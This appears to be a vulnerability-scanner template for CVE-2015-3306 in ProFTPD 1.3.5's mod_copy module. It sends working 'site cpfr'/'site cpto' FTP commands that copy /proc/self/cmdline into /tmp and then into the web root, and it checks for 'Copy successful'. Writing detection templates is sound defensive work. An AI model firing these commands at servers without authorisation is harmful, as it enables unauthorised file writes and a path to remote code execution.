id: CVE-2015-3306

info:
  name: ProFTPd RCE
  author: pdteam
  severity: high
  reference: https://github.com/t0kx/exploit-CVE-2015-3306
  description: The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.
  tags: cve,cve2015,ftp,rce,network
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2015-3306
    cwe-id: CWE-284

network:
  - inputs:
      - data: "site cpfr /proc/self/cmdline\r\n"
        read: 1024
      - data: "site cpto /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpfr /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpto /var/www/html/{{randstr}}\r\n"
    host:
      - "{{Hostname}}:21"
      - "{{Hostname}}"

    read-size: 1024
    matchers:
      - type: word
        words:
          - "Copy successful"
        part: raw